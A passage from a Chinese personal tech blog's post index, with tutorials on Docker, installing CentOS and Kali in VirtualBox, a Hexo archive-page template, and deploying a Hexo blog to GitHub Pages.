sqlmap                    0                    [OK]\nhypnza/sqlmap             A Docker image of sqlmap.                       0                    [OK]\njefftadashi/sqlmap        See my GitHub for more info!                    0                    \n0x01be/sqlmap             github.com/sqlmapproject/sqlmap                 0                    \nvagnerd/sqlmap            SQL Injection Penetration Testing Tool          0                    \npandrew/sqlmap                                                            0                    \nxzdbd/sqlmap              sqlmap                                          0                    [OK]\n[root@localhost key]# \n```\n\n10.查看日志状态成功日志\n\n> 执行命令 systemctl status docker.service \n\n```\n[root@localhost key]# systemctl status docker.service\n● docker.service - Docker Application Container Engine\n   Loaded: loaded (/usr/lib/systemd/system/docker.service; enabled; vendor preset: disabled)\n   Active: active (running) since 五 2022-04-15 12:31:21 CST; 3min 5s ago\n     Docs: https://docs.docker.com\n Main PID: 14798 (dockerd)\n   CGroup: /system.slice/docker.service\n           └─14798 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd...\n\n4月 15 12:31:17 localhost.localdomain dockerd[14798]: time=\"2022-04-15T12:31:17.28...c\n4月 15 12:31:17 localhost.localdomain dockerd[14798]: time=\"2022-04-15T12:31:17.28...c\n4月 15 12:31:17 localhost.localdomain dockerd[14798]: time=\"2022-04-15T12:31:17.28...c\n4月 15 12:31:17 localhost.localdomain dockerd[14798]: time=\"2022-04-15T12:31:17.49...\"\n4月 15 12:31:18 localhost.localdomain dockerd[14798]: time=\"2022-04-15T12:31:18.55...\"\n4月 15 12:31:20 localhost.localdomain dockerd[14798]: time=\"2022-04-15T12:31:20.15...\"\n4月 15 12:31:20 localhost.localdomain dockerd[14798]: time=\"2022-04-15T12:31:20.47...4\n4月 15 12:31:20 localhost.localdomain dockerd[14798]: time=\"2022-04-15T12:31:20.47...\"\n4月 15 12:31:21 localhost.localdomain systemd[1]: Started Docker Application Conta....\n4月 15 12:31:21 localhost.localdomain dockerd[14798]: time=\"2022-04-15T12:31:21.06...\"\nHint: Some lines were ellipsized, use -l to show in full.\n```\n\n卸载Docker\n\n2.查询安装过的包\n\nyum list installed | grep docker\n\n安装过旧版本\n\ndocker.x86_64,docker-client.x86_64,docker-common.x86_64 \n2.删除安装的软件包\n\nyum -y remove docker.x86_64 \n\nyum -y remove docker-client.x86_64 \n\nyum -y remove docker-common.x86_64","categories":["docker"]},{"title":"VirtualBox安装Centos","url":"/vbox-install-centos7/","content":"\n## vbox安装centos\n\n<!-- more -->\n\n打开vbox虚拟机，点击**新建**\n\n类型选择**Linux** 版本选择 **Red Hat(64-bit)** 因为centos是red hat的一个分支，点下一步\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos1.png\" style=\"zoom:67%;\" />\n\n设置内存大小，我给了2G\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos2.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos3.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos4.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos5.png\" style=\"zoom:67%;\" />\n\n装载光驱，来到存储这行，点击没有盘片\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos6.png\" style=\"zoom:67%;\" />\n\n点击 选择虚拟盘，然后去到你放镜像文件的文件，选择centos镜像就行了\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos7.png\" style=\"zoom:67%;\" />\n\n装载镜像成功的样子\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos8.png\" style=\"zoom:67%;\" />\n\n点击启动虚拟机，进入centos安装界面，选择 **Install CentOS Linux 7**，回车\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos9.png\" style=\"zoom:67%;\" />\n\n选择语言: 中文->简体中文\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos10.png\" style=\"zoom:67%;\" />\n\n选择安装系统的磁盘位置\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos11.png\" style=\"zoom:67%;\" />\n\n磁盘默认设置\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos12.png\" style=\"zoom:67%;\" />\n\n选择需要安装的软件\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos13.png\" style=\"zoom:67%;\" />\n\n选择GNOME桌面，点完成\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/centos14.png\" style=\"zoom:67%;\" />\n\n要改一下时间和时区 要确保是上海并且时间跟你的电脑对的上\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos15.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos16.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos17.png\" style=\"zoom:67%;\" />\n\n设置ROOT密码\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos18.png\" style=\"zoom:67%;\" />\n\n输入密码，点完成即可 **zhu1979**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos20.png\" style=\"zoom:67%;\" />\n\n设置好ROOT密码，系统就会自动安装，等30分钟\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos22.png\" style=\"zoom:67%;\" />\n\n安装成功后重启 \n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos23.png\" style=\"zoom:67%;\" />\n\n点击未接受许可证\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos24.png\" style=\"zoom:67%;\" />\n\n勾上同意，点完成，**回到页面点完成配置**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos25.png\" style=\"zoom:67%;\" />\n\n选择汉语，点前进\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/ic71.png\" style=\"zoom:67%;\" />\n\n键盘布局选择英语-美国，点前进\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/ic72.png\" style=\"zoom:67%;\" />\n\n隐私选择关闭，点前进\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/ic73.png\" style=\"zoom:67%;\" />\n\n时区选择上海\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/ic74.png\" style=\"zoom:67%;\" />\n\n在线账号，选择跳过\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/ic75.png\" style=\"zoom:67%;\" />\n\n填写用户名称，点击前进\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/ic76.png\" style=\"zoom:67%;\" />\n\n设置密码，点前进\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/ic77.png\" style=\"zoom:67%;\" />\n\n安装完成\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/ic78.png\" style=\"zoom:67%;\" />\n\n\n\n> 一定要创建快照\n\nvbox centos安装增强功能\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos29.png\" style=\"zoom:67%;\" />\n\n点击运行\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos30.png\" style=\"zoom:67%;\" />\n\n他需要超级管理员权限才安装，我们输入密码，点认证\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos31.png\" style=\"zoom: 67%;\" />\n\n回车退出，再打开命令行输入reboot 重启\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//centos32.png\" style=\"zoom:67%;\" />\n\n安装完成，**重启系统生效**。\n\n使用命令\n\nsu 输入密码之后进入root权限","categories":["centos"]},{"title":"hexo-matery 归档页修改","url":"/matery-gdy-mhua/","content":"\n之前得到了大佬分享的修改的归档页面源码打算贴出来需要的自取，建议先备份archive.ejs文件再修改有备无患，养成备份好习惯。\n\n<!-- more -->\n\n```js\n<style>\n    /*归档页自定义样式*/\n    .archive-container{\n      padding: 20px;\n      -webkit-border-radius: 5px;\n      -moz-border-radius: 5px;\n      border-radius: 5px;\n      background-color: #fff;\n    }\n    .archive:not(:last-child) {\n      margin-bottom: 3rem;\n    }\n\n    .archive .articles {\n      border-left: 1px solid #dbdbdb;\n    }\n\n    .archive .article {\n      border-top: none;\n      margin-left: -1px;\n      padding: 0.4rem 1.5rem;\n      border-left: 3px solid transparent;\n    }\n\n    .archive .article:hover {\n      transition: all .6s;\n      -webkit-transition: all .6s;\n      -o-transition: all .6s;\n      -moz-transition: all .6s;\n      border-left-color: #0f9d58 ;\n    }\n\n    .archive .article time {\n      font-size: 1rem;\n      color: deeppink;\n      /* color: darkgray; */\n    }\n    article-sort-item_title{\n      display: -webkit-box;\n      overflow: hidden;\n      height: 60px;\n      color: #4c4948;\n      font-size: .75rem;\n      -webkit-transition: all .3s;\n      -moz-transition: all .3s;\n      -o-transition: all .3s;\n      -ms-transition: all .3s;\n      transition: all .3s;\n      -webkit-line-clamp: 2;\n      -webkit-box-orient: vertical;\n    }\n\n    .archive .article h6 {\n      margin: 0;\n    }\n\n    .archive .article h6 a {\n      line-height: 2.5;\n      color: inherit;\n      border-bottom: 1px dashed transparent;\n    }\n\n    .archive .article h6 a:hover {\n      border-bottom-color: #0f9d58;\n      padding-left: 16px;\n      transition: all .5s;\n      -webkit-transition: all .5s;\n      -o-transition: all .5s;\n      -moz-transition: all .5s;\n    }\n\n    .archive .articles .imgcontent{\n      display: inline-block;\n      width: 80px;\n      height: 80px;\n      overflow: hidden;\n    }\n\n    .archive .articles .imgcontent .postimg{\n      width: 100%;\n      height: 100%;\n      object-fit: cover;\n    }\n    .archive .articles .imgcontent .postimg:hover{\n      transform: scale(1.3);\n      transition: all .6s;\n      -webkit-transition: all .6s;\n      -o-transition: all .6s;\n      -moz-transition: all .6s;\n    }\n    .article-sort-post{\n      display: inline-block;\n      position: relative;\n      top: -16px;\n      left: 10px;\n    }\n\n    .hbe-input-container{\n      width: 80%;\n      max-width: 800px;\n      position: relative;\n      margin: 100px auto;\n    }\n\n    .hbe-input-container  .btn-decrypt{\n      display: inline-block;\n      vertical-align: top;\n      width: 120px;\n      height: 32px;\n      line-height: 32px;\n      font-size: 16px;\n      color: #ffffff;\n      background-color: #3f90ff;\n      text-align: center;\n      -webkit-border-radius: 3px;\n      -moz-border-radius: 3px;\n      border-radius: 3px;\n    }\n    .about-cover {\n      height: 50vh;\n    }\n    .desc-content{\n      padding: 0 50px;\n    }\n    @media only screen and (max-width: 601px) {\n      .desc-content {\n        padding: 0 15px;\n      }\n    }\n\n    .v .vlist .vcard {\n      padding-top: 2.5em !important;\n    }\n\n </style>\n\n<%- partial('_partial/bg-cover') %>\n\n<main class=\"content\">\n\n    <% if (theme.postCalendar) { %>\n        <%- partial('_widget/post-calendar') %>\n    <% } %>\n\n    <div class=\"container archive-container \">\n        <div class=\"card\">\n            <div class=\"card-content\">\n                <!-- 主题 挂件 （中） -->\n                <!-- <div class=\"caishendengsd\">        \n                  <div class=\"guguxiansd wenzhangxian\">\n                    <img class=\"caishenpic gugus\" src=\"/medias/christmas-img/2.png\">\n                  </div>              \n                </div>\n                <div class=\"caishendeng\">        \n                  <div class=\"guguxian wenzhangxian\">\n                    <img class=\"caishenpic gugus\" src=\"/medias/spring-img/2.png\">\n                  </div>              \n                </div> -->\n                <div class=\"tag-chips\">\n                    <span onclick=\"showTable()\" id=\"sp-table\" class=\"chip center-align waves-effect waves-light default\"\n                          data-tagname=\"时间列表\"\n                          style=\"background: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%); color:#fff\">时间列表\n                    </span>\n                    <span onclick=\"showTime()\" id=\"sp-timeline\"\n                          class=\"chip center-align waves-effect waves-light default\"\n                          data-tagname=\"时间轴\" style=\"background-color: #F9EBEA;\">时间轴\n                    </span>\n                </div>\n            </div>\n        </div>\n    </div>\n\n    <div id=\"cd-table\" class=\"container archive-container\">\n        <div class=\"card\">\n            <div class=\"card-content\">\n                <% const groups = {};\n                const years = [];\n                page.posts.each(post => {\n                    const year = post.date.year();\n                    if (typeof (groups[year]) === 'undefined') {\n                        groups[year] = [];\n                        years.push(year);\n                    }\n                    groups[year].push(post);\n                });\n                years.sort((a, b) => b - a); %>\n                <% for (let year of years) { %>\n                    <div class=\"archive\">\n                        <h4 class=\"archive-year\" id=\"<%= year %>\"><%= year %>年</h4>\n                        <div class=\"articles\">\n                            <% for (let post of groups[year].sort((a, b) => b.date.diff(a.date))) { %>\n                                <div class=\"article content>\">\n                                <!--  <a href=\"<%= url_for(post.link ? post.link : post.path) %>\">\n                                    <div class=\"imgcontent\"><img class=\"postimg\" src=\"<%= post.img %>\" alt=\"<%= post.title %>\"></div>  \n                                  </a> -->\n                                  <div class=\"article-sort-post\">\n                                    <div class=\"article-sort-item_title\">\n                                      <a href=\"<%= url_for(post.link ? post.link : post.path) %>\">\n                                        <h5>\n                                          <i class=\"fa fa-clock\" style=\"font-size: 1rem;cursor: pointer;\"></i>\n                                          <time class=\"is-text-small\" datetime=\"<%= date_xml(post.date) %>\" itemprop=\"datePublished\" >\n                                            <%= date(post.date, 'YYYY-MM-D') %> \n                                          </time>\n                                        </h5>\n                                        <h6 class=\"is-6\"><a href=\"<%= url_for(post.link ? post.link : post.path) %>\"><%= post.title %></a></h6>\n                                      </a>\n                                    </div>\n                                  </div>\n                                </div>\n                            <% } %>\n                        </div>\n                    </div>\n                <% } %>\n            </div>\n        </div>\n    </div>\n    <%\n    /**\n     * hashCode function.\n     *\n     * @param str str\n     * @returns {number}\n     */\n    var hashCode = function (str) {\n        if (!str && str.length === 0) {\n            return 0;\n        }\n\n        var hash = 0;\n        for (var i = 0, len = str.length; i < len; i++) {\n            hash = ((hash << 5) - hash) + str.charCodeAt(i);\n            hash |= 0;\n        }\n        return hash;\n    };\n\n    // init year and month variable.\n    var year = '1970';\n    var month = '1970-01';\n\n    // post feature image.\n    var featureimg = '/medias/featureimages/0.jpg';\n    var featureImages = theme.featureImages;\n    %>\n\n    <div id=\"cd-timeline\" class=\"container\" style=\"display: none\">\n        <% page.posts.each(function(post) { %>\n            <div class=\"cd-timeline-block\">\n\n                <%# year. %>\n                <% if (date(post.date, 'YYYY') != year) { %>\n                    <% year = date(post.date, 'YYYY'); %>\n                    <div class=\"cd-timeline-img year\" data-aos=\"zoom-in-up\">\n                        <a href=\"<%- url_for('/archives/' + year) %>\"><%- year %></a>\n                    </div>\n                <% } %>\n\n                <%# month. %>\n                <% if (date(post.date, 'YYYY-MM') != month) { %>\n                    <%\n                        month = date(post.date, 'YYYY-MM');\n                        var m = date(post.date, 'MM')\n                    %>\n                    <div class=\"cd-timeline-img month\" data-aos=\"zoom-in-up\">\n                        <a href=\"<%- url_for('/archives/' + year + '/' + m) %>\"><%- m %></a>\n                    </div>\n                <% } %>\n\n                <%# every day posts. %>\n                <div class=\"cd-timeline-img day\" data-aos=\"zoom-in-up\">\n                    <span><%- date(post.date, 'YYYY-MM-DD').substring(8, 10) %></span>\n                </div>\n                <article class=\"cd-timeline-content\" data-aos=\"fade-up\">\n                    <div class=\"article col s12 m6\">\n                        <div class=\"card\">\n                            <a href=\"<%- url_for(post.path) %>\">\n                                <div class=\"card-image\">\n                                    <% if (post.img) { %>\n                                        <img src=\"<%= post.img %>\" class=\"responsive-img\" alt=\"<%- post.title %>\">\n                                    <% } else { %>\n                                        <%\n                                            var len = featureImages.length;\n                                            var num = Math.abs(hashCode(post.title) % len);\n                                            featureimg = featureImages[num];\n                                        %>\n                                        <img src=\"<%= featureimg %>\" class=\"responsive-img\" alt=\"<%- post.title %>\">\n                                    <% } %>\n                                    <span class=\"card-title\"><%- post.title %></span>\n                                </div>\n                            </a>\n                            <div class=\"card-content article-content\">\n                                <div class=\"summary block-with-text\">\n                                    <% if (post.summary && post.summary.length > 0) { %>\n                                        <%- post.summary %>\n                                    <% } else { %>\n                                        <%- strip_html(post.content).substring(0, 120) %>\n                                    <% } %>\n                                </div>\n                                <div class=\"publish-info\">\n                                <span class=\"publish-date\">\n                                    <i class=\"far fa-clock fa-fw icon-date\"></i><%= date(post.date, config.date_format) %>\n                                </span>\n                                    <span class=\"publish-author\">\n                                        <% if (post.categories && post.categories.length > 0) { %>\n                                            <i class=\"fas fa-bookmark fa-fw icon-category\"></i>\n                                            <% post.categories.forEach(category => { %>\n                                                <a href=\"<%- url_for(category.path) %>\" class=\"post-category\"\n                                                   target=\"_blank\">\n                                    <%- category.name %>\n                                    </a>\n                                            <% }); %>\n                                        <% } else if (post.author && post.author.length > 0) { %>\n                                            <i class=\"fas fa-user fa-fw\"></i>\n                                            <%- post.author %>\n                                        <% } else { %>\n                                            <i class=\"fas fa-user fa-fw\"></i>\n                                            <%- config.author %>\n                                        <% } %>\n                                    </span>\n                                </div>\n                            </div>\n\n                            <% if (post.tags && post.tags.length) { %>\n                                <div class=\"card-action article-tags\">\n                                    <% post.tags.forEach(tag => { %>\n                                        <a href=\"<%- url_for(tag.path) %>\"><span\n                                                    class=\"chip bg-color\"><%= tag.name %></span></a>\n                                    <% }); %>\n                                </div>\n                            <% } %>\n                        </div>\n                    </div>\n                </article>\n            </div>\n        <% }); %>\n    </div>\n\n</main>\n<% if (page.total > 1) { %>\n    <%- partial('_partial/paging') %>\n<% } %>\n\n<script>\n    function showTime() {\n        $(\"#cd-timeline\").show();\n        $(\"#cd-table\").hide();\n        $(\"#sp-timeline\").css('background', 'linear-gradient(to right, #4cbf30 0%, #0f9d58 100%)');\n        $(\"#sp-timeline\").css('color', '#fff');\n        $(\"#sp-table\").css('background', '#F9EBEA')\n        $(\"#sp-table\").css('color', 'rgba(0,0,0,0.6)');\n    }\n\n    function showTable() {\n        $(\"#cd-timeline\").hide();\n        $(\"#cd-table\").show();\n        $(\"#sp-table\").css('background', 'linear-gradient(to right, #4cbf30 0%, #0f9d58 100%)');\n        $(\"#sp-table\").css('color', '#fff');\n        $(\"#sp-timeline\").css('background', '#F9EBEA')\n        $(\"#sp-timeline\").css('color', 'rgba(0,0,0,0.6)');\n    }\n\n</script>\n```","categories":["hexo博客"]},{"title":"VirtualBox安装kali","url":"/vbbox-install-kali/","content":"\n## vbox安装Kali\n\n<!-- more -->\n\n打开vbox，点击**新建**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali-1.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali-2.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali-3.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kaloi3-1.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali-4.png\" style=\"zoom:67%;\" />\n\n磁盘我们按照需求给，点创建到这里准备基本结束了\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali-5.png\" style=\"zoom:67%;\" />\n\n装载镜像，来到存储这里，点击没有盘片\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali-6.png\" style=\"zoom:67%;\" />\n\n点选择虚拟盘，再去到你镜像的那个目录选择镜像就行\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali-7.png\" style=\"zoom:67%;\" />\n\n装载成功\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali-8.png\" style=\"zoom:67%;\" />\n\n\n\n1. 选择**Graphical install 回车**，等一会\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali9.png\" style=\"zoom: 80%;\" />\n\n2.选择**中文(简体)**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali10.png\" style=\"zoom:67%;\" />\n\n3.默认选择**中国**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali11.png\" style=\"zoom: 67%;\" />\n\n4.配置键盘选**美式英语**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali12.png\" style=\"zoom: 67%;\" />\n\n5.配置网络-**输入主机名**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali13.png\" style=\"zoom:67%;\" />\n\n配置网络这里，**域名不用填**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali14.png\" style=\"zoom: 67%;\" />\n\n6.**设置用户和密码**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali15.png\" style=\"zoom:67%;\" />\n\n7.硬盘分区选择**向导-使用整整个磁盘**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali16.png\" style=\"zoom:67%;\" />\n\n8.磁盘分区 **选择第一行点继续**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali17.png\" style=\"zoom:67%;\" />\n\n9.磁盘分区 选定要分区 **选第一行点继续**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali18.png\" style=\"zoom:67%;\" />\n\n10.磁盘分区 分区向导 选**结束分区设定并将修改写入磁盘点继续**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali19.png\" style=\"zoom:67%;\" />\n\n11.磁盘分区 选择**是**\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali20.png\" style=\"zoom:67%;\" />\n\n安装系统，等一会，十几分钟\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali21.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali22.png\" style=\"zoom:67%;\" />\n\n等待十几分钟\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali23.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali24.png\" style=\"zoom:67%;\"  />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali25.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali26.png\" style=\"zoom:67%;\"  />\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali27.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali29.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali30.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali31.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali32.png\" style=\"zoom:67%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali33.png\" style=\"zoom:67%;\" />\n\n\n\n结束安装进程，等几分钟就行\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali34.png\" style=\"zoom:67%;\" />\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali35.png\" style=\"zoom:67%;\" />\n\n\n\n> 等下成功之后记得做快照再换源\n\n\n\n## VBOX 安装增强功能\n\n1.把VBoxLinuxAdditions.run 复制到桌面\n\n2.给他添加读写的功能 chmod 777 VBoxLinuxAdditions.run\n\n3.执行VBoxLinuxAdditions.run---> sudo ./VBoxLinuxAdditions.run //安装增强功能\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//kali36.png\" style=\"zoom:67%;\" />\n\n安装完成之后就重启--> reboot\n\nkali2019换源\n\n别用阿里源，使用**中科大的源会好**一点\n\n```\nsudo gedit /etc/apt/sources.list //打开源的地址\n//中科大的源，如果是http就会报错，https就不会报错 //https是灵魂\ndeb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\ndeb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n```\n\n","categories":["Linux"]},{"title":"github从0到1搭建博客","url":"/boke/","content":"# github搭建博客\n\n<!-- more -->\n\n首先需要安装的的是git和node\n\nos：win7\n\nGit: v2.31.1\n\nnodejs: v12.20.1\n\n## 1.安装git\n\n验证是否安装成功：git --version\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk1.png)\n\n## 2.安装node\n\n验证是否安装成功：node -v，npm -v\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexoboke2.png)\n\nGit和node安装成功之后，选择一个盘创建一个文件夹名为:**bg**，然后进入这个文件夹，右键Git Bash here打开进来命令行界面\n\n## 3.安装淘宝源\n\n>  执行命令：\n>\n> npm install -g cnpm --registry=https://registry.npmmirror.com\n> npm config set registry=https://registry.npmmirror.com\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk3.png)\n\n## 4.在bg文件夹安装hexo\n\n安装命令: cnpm install hexo -g\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk4.png)\n\n测试是否安装成功，命令：hexo -v\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk5.png)\n\n## 5.初始文件夹blog\n\n> 这个blog文件夹就是我们的博客根目录\n>\n> 初始化一个文件夹，命令：hexo init blog ，下面就是初始化的样子\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk6.png)\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk7.png)\n\n## 6.在blog也就是博客根目录安装hexo依赖\n\ncd blog //进入blog目录\n\n命令: cnpm install --save hexo-deployer-git\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk8.png)\n\n## 7.git配置SSH key\n\n(1)配置ssh\n\n> 先生成ssh key\n>\n> ssh-keygen -t rsa -C \"邮箱地址\"\n>\n> 备注：这里的邮件地址是github账号绑定的邮件地址\n\n在根目录kblog输入生成命令：ssh-keygen -t rsa -C \"邮箱地址\"后。连续回车三次即可。\n\n可以看到在用户文件夹(C:\\Users\\host)生成了一个ssh文件夹\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk9.png)\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk10.png\" style=\"zoom:80%;\" />\n\n进入到ssh文件夹，复制id_rsa.pub文件里全部内容\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk11.png\" style=\"zoom:80%;\" />\n\n接着打开github主页，点击个人设置，点击左侧的SSH and GPG keys，点击New SSH key\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk12.png\" style=\"zoom:67%;\" />\n\n将id_rsa.pub复制的内容粘贴到key中，title随便起一个就行。\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk13.png)\n\n点击 Add SSH key,会跳出一个页面要求输入你的github账号，输入即可\n\n> 测试是否成功：\n>\n> ssh -T git@github.com\n\n输入测试命令后，接着输入yes，出现下面这个提示说明成功\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk14.png\" style=\"zoom: 0%;\" />\n\n## 8.进入根目录blg 配置账号和密码\n\n```\ngit config --global user.name \"xxx\" #双引号里面填写你的github用户名\ngit config --global user.email \"xx@qq.com\" #双引号里面填写你的github注册邮箱\n```\n\n## 9.部署到github\n\n(1)新建一个github仓库\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk15.png)\n\n**给仓库起名，这里一定要注**意\n\n> 仓库名称格式：用户名.github.io\n>\n> 记得选择下面这些选项\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk16.png\" style=\"zoom:67%;\" />\n\n(2)编辑_config.yml,_config.yml文件在博客根目录(blog)文件夹下\n\n\n```\ndeploy:\n  type: git\n  repository: git@github.com:github用户名/xxx.github.io.git-->博客仓库名称\n  branch: master //部署到master分支\n```\n\n(3)修改分支名称\n\n这边我们需要到仓库设置这边修改**Branches分支**，把**main**修改为**master**\n\n点击笔会跳出一个框，要求你输入修改后的名字\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk17.png)\n\n输入之后，点击Rename branch 即可修改成功\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk18.png)\n\n(4)把文件上传到Github\n\n> 执行命令 hexo clean&&hexo g&&hexo d\n>\n> hexo clean //清除缓存\n> hexo g //生成html文件\n> hexo d //上传到github\n\n**部署成功的标识**\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk19.png)\n\n\n\n然后查看博客的样子\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk20.png)\n\n## 10.更换主题\n\n### (1)mions主题\n\nmions主题是一个极为简洁的主题，具体看[长亭大佬的博客](https://bkfish.gitee.io/index.html)\n\n源码下载：[hexo-theme-minos：一个简单而复古风格的Hexo主题，更专注于你的想法](https://github.com/ppoffice/hexo-theme-minos/releases/tag/2.4.0)\n\n源码下载好，放到theme文件夹，并重命名为mions\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk21.png)\n\nmions需要的包有：\n\n1.cheerio 安装命令：cnpm install cheerio\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk22.png)\n\n2.lodash 安装命令：cnpm install lodash\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk23.png)\n\n3.hexo-renderer-sass 安装命令cnpm install hexo-renderer-sass\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk24.png)\n\n根目录blog下的_config.yml配置修改\n\n```bash\n增加以下内容\n# URL\n## Set your site url here. For example, if you use GitHub Page, set url as 'https://username.github.io/project'\nurl: https://github用户名.github.io\npermalink: :slug/\n\n# 